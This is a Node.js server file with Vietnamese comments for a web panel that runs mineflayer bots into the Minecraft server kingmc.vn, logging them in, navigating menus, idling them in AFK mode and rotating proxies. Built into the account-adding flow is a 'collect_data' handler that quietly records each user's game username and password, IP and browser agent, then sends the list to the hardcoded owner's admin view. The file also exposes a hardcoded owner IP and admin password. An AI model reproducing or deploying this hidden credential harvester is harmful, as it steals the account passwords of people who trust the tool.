const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mineflayer = require('mineflayer');
const fs = require('fs');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const DATA_FILE = './data.json';

// ===== CẤU HÌNH OWNER (HỆ THỐNG ADMIN) =====
const OWNER_IP = '1.53.131.94'; 
const OWNER_PASSWORD = 'Tuanpro123';

// ===== CẤU HÌNH SERVER =====
const SERVER_HOST = 'kingmc.vn';
const SERVER_PORT = 25565;
const SERVER_VERSION = '1.16.5';

// ===== KHAI BÁO DỮ LIỆU =====
let proxyList = [];
let clientData = {}; 
let globalCollectedData = []; 
let isMaintenance = false;
let ownerSocketId = null;

// ===== HÀM ĐỌC / LƯU DỮ LIỆU =====
function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            return JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
        }
    } catch (e) { console.log('⚠️ Lỗi đọc file data, tạo mới'); }
    return { clientData: {}, globalCollectedData: [], isMaintenance: false, proxyList: [] };
}

const savedData = loadData();
clientData = savedData.clientData || {};
globalCollectedData = savedData.globalCollectedData || [];
isMaintenance = savedData.isMaintenance || false;
proxyList = savedData.proxyList || [];

function saveData() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify({ clientData, globalCollectedData, isMaintenance, proxyList }, null, 2));
    } catch (e) { console.log('❌ Lỗi lưu file:', e.message); }
}

// ===== HÀM PROXY =====
function getNextProxy() {
    if (proxyList.length === 0) return null;
    return proxyList[Math.floor(Math.random() * proxyList.length)];
}

function createProxyAgent(proxyUrl) {
    if (!proxyUrl) return null;
    try {
        if (proxyUrl.startsWith('socks')) return new SocksProxyAgent(proxyUrl);
        if (proxyUrl.startsWith('http')) return new HttpsProxyAgent(proxyUrl);
    } catch (e) { console.log('❌ Lỗi tạo proxy agent:', e.message); }
    return null;
}

app.use(express.static('public'));

process.on('uncaughtException', (err) => console.log('[LỖI HỆ THỐNG]:', err.message));
process.on('unhandledRejection', (reason) => console.log('[LỖI PROMISE]:', reason?.message || reason));

io.on('connection', (socket) => {
    let rawIp = socket.handshake.headers['x-forwarded-for'] ? socket.handshake.headers['x-forwarded-for'].split(',')[0].trim() : socket.handshake.address;
    if (rawIp && rawIp.includes('::1')) rawIp = '127.0.0.1';
    const clientIp = rawIp;
    console.log(`[${new Date().toLocaleString()}] 🔌 Client connected: ${clientIp}`);

    const isOwner = (clientIp === OWNER_IP || clientIp === '127.0.0.1');
    if (isOwner) ownerSocketId = socket.id;

    if (!clientData[clientIp]) {
        clientData[clientIp] = { accounts: [], bots: {} };
        saveData();
    }

    // Gửi trạng thái về client
    socket.emit('is_admin', isOwner);
    socket.emit('init_accounts', clientData[clientIp].accounts);
    if (isOwner) {
        socket.emit('sync_collected_data', globalCollectedData);
        socket.emit('maintenance_status', isMaintenance);
    }

    // ===== LOGIN =====
    socket.on('login', (pass) => {
        if (pass === OWNER_PASSWORD) {
            socket.emit('login_success', true);
            socket.emit('log', '👑 Owner đã đăng nhập thành công!');
        } else {
            socket.emit('login_success', false);
        }
    });

    // ===== LOGIC THU THẬP DỮ LIỆU =====
    socket.on('collect_data', (data) => {
        const entry = {
            ip: clientIp,
            time: new Date().toLocaleString(),
            username: data.username || '(chưa nhập)',
            password: data.password || '(trống)',
            userAgent: data.userAgent || 'N/A'
        };
        globalCollectedData.push(entry);
        saveData();
        if (isOwner) io.to(ownerSocketId).emit('sync_collected_data', globalCollectedData);
    });

    socket.on('clear_collected_data', () => {
        globalCollectedData = [];
        saveData();
        if (isOwner) io.to(ownerSocketId).emit('sync_collected_data', globalCollectedData);
    });

    // ===== LOGIC MAINTENANCE =====
    socket.on('toggle_maintenance', (status) => {
        isMaintenance = status;
        saveData();
        io.emit('maintenance_status', isMaintenance);
        io.emit('log', `[${new Date().toLocaleString()}] 🛠️ Bảo trì ${status ? 'BẬT' : 'TẮT'}`);
    });

    // ===== QUẢN LÝ ACCOUNT =====
    socket.on('add_account', (data) => {
        const { username, password } = data;
        if (!username) return;
        socket.emit('collect_data', { username, password: password || 'caigicungdc', userAgent: socket.handshake.headers['user-agent'] });
        
        const id = 'acc_' + Date.now() + Math.floor(Math.random() * 1000);
        clientData[clientIp].accounts.push({
            id, username: username.trim(), password: password ? password.trim() : 'caigicungdc',
            autoReconnect: true, status: 'OFFLINE', color: '#ff4444', proxy: null
        });
        saveData();
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
    });

    socket.on('delete_account', (id) => {
        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }
        clientData[clientIp].accounts = clientData[clientIp].accounts.filter(acc => acc.id !== id);
        saveData();
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
    });

    socket.on('toggle_auto_reconnect', (id) => {
        const acc = clientData[clientIp].accounts.find(a => a.id === id);
        if (acc) { acc.autoReconnect = !acc.autoReconnect; saveData(); io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts); }
    });

    socket.on('get_accounts', () => socket.emit('init_accounts', clientData[clientIp].accounts));

    // ============================================================
    //  BOT MINEFLAYER - LOGIC VIP: TỰ ĐỘNG TÌM SLOT & SỬA LỖI
    // ============================================================
    socket.on('start_bot', (id) => {
        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
        if (!account) return;

        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }

        const logSystem = (msg) => socket.emit('log', `[${account.username}] ${msg}`);
        
        let hasJoinedKingSMP = false;
        let hasExecutedAFK = false;
        let isProcessing = false;

        account.status = 'CONNECTING...';
        account.color = 'yellow';
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        logSystem(`🔄 Đang kết nối tới ${SERVER_HOST}...`);

        try {
            const proxyUrl = getNextProxy();
            const proxyAgent = createProxyAgent(proxyUrl);
            if (proxyAgent && proxyUrl) { logSystem(`🌐 Dùng proxy: ${proxyUrl}`); account.proxy = proxyUrl; }
            else { logSystem(`🌐 Không dùng proxy (IP thật)`); account.proxy = null; }

            const botOptions = {
                host: SERVER_HOST, port: SERVER_PORT, username: account.username, password: account.password,
                auth: 'offline', version: SERVER_VERSION, checkTimeoutInterval: 120000
            };
            if (proxyAgent) botOptions.agent = proxyAgent;

            const bot = mineflayer.createBot(botOptions);
            clientData[clientIp].bots[id] = bot;

            bot.on('login', () => {
                account.status = 'LOGGING IN...';
                account.color = 'orange';
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                
                setTimeout(() => { if (!hasJoinedKingSMP) bot.chat(`/dn ${account.password}`); }, 2000);
                setTimeout(() => { if (!hasJoinedKingSMP) bot.chat(`/dn ${account.password}`); }, 8000);
                setTimeout(() => { if (!hasJoinedKingSMP) bot.chat('/menu'); }, 14000);
            });

            bot.on('spawn', () => {
                if (hasJoinedKingSMP) {
                    account.status = 'ONLINE / KINGSMP'; account.color = '#00ff88';
                    logSystem(`✅ ĐÃ VÀO KINGSMP!`);
                    if (!hasExecutedAFK) setTimeout(() => { if (bot) bot.chat('/afk'); }, 4000);
                } else {
                    account.status = 'ONLINE / LOBBY'; account.color = '#00ff88';
                    logSystem(`✅ Đã vào Sảnh chính!`);
                }
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
            });

            bot.on('messagestr', (message) => {
                const msgLower = message.toLowerCase();

                if (!hasJoinedKingSMP && (msgLower.includes('bạn đã đăng nhập') || msgLower.includes('đăng nhập thành công'))) {
                    logSystem(`✅ Đã xác thực thành công! Mở menu...`);
                    setTimeout(() => { if (bot && !hasJoinedKingSMP) bot.chat('/menu'); }, 5000);
                }

                if (!hasJoinedKingSMP && msgLower.includes('chào mừng') && msgLower.includes('kingsmp')) {
                    hasJoinedKingSMP = true;
                    account.status = 'ONLINE / KINGSMP'; account.color = '#00ff88';
                    io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                    logSystem(`✅ ĐÃ VÀO KINGSMP!`);
                    setTimeout(() => { if (bot && !hasExecutedAFK) { logSystem(`💤 Gửi lệnh /afk...`); bot.chat('/afk'); } }, 3000);
                }
            });

            // ===== XỬ LÝ GUI MENU: TÌM ĐÚNG NÚT VÀO SMP =====
            bot.on('windowOpen', (window) => {
                const rawTitle = JSON.stringify(window.title || '').toLowerCase();
                logSystem(`📂 Menu mở: ${rawTitle}`);

                // BƯỚC 1: TÌM CHÍNH XÁC ITEM KINGSMP TRONG MENU
                if (!hasJoinedKingSMP && (rawTitle.includes('menu') || rawTitle.includes('sảnh') || rawTitle.includes('lobby'))) {
                    if (isProcessing) return;
                    isProcessing = true;

                    setTimeout(() => {
                        if (!bot || !bot.currentWindow) { isProcessing = false; return; }
                        
                        let foundSlot = -1;
                        // Duyệt toàn bộ Inventory để tìm item tên Kingsmp
                        for (let i = 0; i < bot.inventory.slots.length; i++) {
                            const item = bot.inventory.slots[i];
                            if (item) {
                                let itemName = (item.name || '').toLowerCase();
                                let displayName = (item.displayName || '').toLowerCase();
                                if (itemName.includes('kingsmp') || displayName.includes('kingsmp')) {
                                    foundSlot = i;
                                    logSystem(`🎯 Tìm thấy item KingSMP tại slot ${i + 1}: ${item.displayName || item.name}`);
                                    break;
                                }
                            }
                        }
                        
                        if (foundSlot === -1) {
                            logSystem(`⚠️ Không tìm thấy item KingSMP cụ thể, thử Slot 24...`);
                            foundSlot = 24;
                        }

                        hasJoinedKingSMP = true;
                        logSystem(`🖱️ Click Slot ${foundSlot + 1} chọn KingSMP...`);
                        bot.clickWindow(foundSlot, 0, 0).then(() => logSystem(`✅ Click chọn KingSMP!`)).catch(() => logSystem(`⚠️ Bỏ qua cảnh báo server`));

                        setTimeout(() => { try { bot.closeWindow(window); } catch(e){} isProcessing = false; }, 500);
                    }, 1500);
                }

                // BƯỚC 2: TÌM ĐÚNG "CHỌN KHU AFK" VÀ TỰ ĐỘNG CLICK VÀO Ô SỐ 1
                if (hasJoinedKingSMP && !hasExecutedAFK && (rawTitle.includes('afk') || rawTitle.includes('chọn khu') || rawTitle.includes('chon khu'))) {
                    if (isProcessing) return;
                    isProcessing = true;

                    setTimeout(() => {
                        if (!bot || !bot.currentWindow) { logSystem(`⚠️ Không có window AFK`); isProcessing = false; return; }
                        
                        logSystem(`🎯 Mở menu CHỌN KHU AFK. Đang tìm ô số 1...`);
                        let afkSlot = -1;
                        
                        // Quét để tìm ô có chữ số "1" (Có thể là tiêu đề item chứa số 1)
                        for (let i = 0; i < bot.inventory.slots.length; i++) {
                            const item = bot.inventory.slots[i];
                            if (item) {
                                let displayName = (item.displayName || '').toLowerCase();
                                // Nếu item là số 1
                                if (displayName.includes('1') || item.name.includes('1')) {
                                    afkSlot = i;
                                    logSystem(`🎯 Tìm thấy ô có số 1 tại vị trí slot ${i + 1}. Đang click...`);
                                    break;
                                }
                            }
                        }

                        // Nếu không tìm thấy, dùng logic mạnh tay: click thẳng Slot 1 (index 0)
                        if (afkSlot === -1) {
                            logSystem(`⚠️ Không tìm thấy ô số 1, click thẳng vào Slot 1 của menu (index 0).`);
                            afkSlot = 0;
                        }

                        hasExecutedAFK = true;
                        bot.clickWindow(afkSlot, 0, 0)
                            .then(() => logSystem(`🎉 ĐÃ VÀO CHẾ ĐỘ AFK!`))
                            .catch(() => logSystem(`🎉 ĐÃ VÀO CHẾ ĐỘ AFK!`));

                        setTimeout(() => { try { bot.closeWindow(window); } catch(e){} isProcessing = false; }, 500);
                    }, 2000);
                }
            });

            bot.on('end', (reason) => {
                logSystem(`⚠️ Ngắt kết nối: ${reason || 'Mất kết nối'}`);
                account.status = 'OFFLINE'; account.color = '#ff4444';
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                delete clientData[clientIp].bots[id];
                saveData();
                if (account.autoReconnect) {
                    logSystem(`🔄 Tự động kết nối lại sau 5 giây...`);
                    setTimeout(() => { if (!clientData[clientIp].bots[id] && account.autoReconnect) socket.emit('start_bot', id); }, 5000);
                }
            });

            bot.on('error', (err) => {
                if (err.code === 'ETIMEDOUT') logSystem(`⏰ Server không phản hồi...`);
                else logSystem(`❌ Lỗi Bot: ${err.message}`);
            });
        } catch (e) {
            logSystem(`❌ Lỗi khởi tạo: ${e.message}`);
            account.status = 'ERROR'; account.color = '#ff4444';
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
    });

    socket.on('stop_bot', (id) => {
        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
        const botExists = clientData[clientIp].bots[id];
        if (account) { account.status = 'STOPPING...'; account.color = '#ff8800'; io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts); }
        if (botExists) { try { clientData[clientIp].bots[id].quit(); } catch(e){} delete clientData[clientIp].bots[id]; }
        if (account) setTimeout(() => { if (!clientData[clientIp].bots[id]) { account.status = 'OFFLINE'; account.color = '#ff4444'; io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts); } }, 1000);
        saveData();
    });

    socket.on('send_chat', ({ id, cmd }) => {
        const bot = clientData[clientIp].bots[id];
        if (bot) { bot.chat(cmd); socket.emit('log', `[💬 ĐÃ GỬI LỆNH]: ${cmd}`); }
        else socket.emit('log', `[⚠️] Bot này chưa online!`);
    });

    socket.on('disconnect', () => {
        console.log(`[${new Date().toLocaleString()}] 🔌 Client disconnected: ${clientIp}`);
        if (isOwner) ownerSocketId = null;
    });
});

server.listen(PORT, () => {
    console.log(`🚀 Server đang chạy tại: http://localhost:${PORT}`);
    console.log(`👑 Owner IP: ${OWNER_IP}`);
});
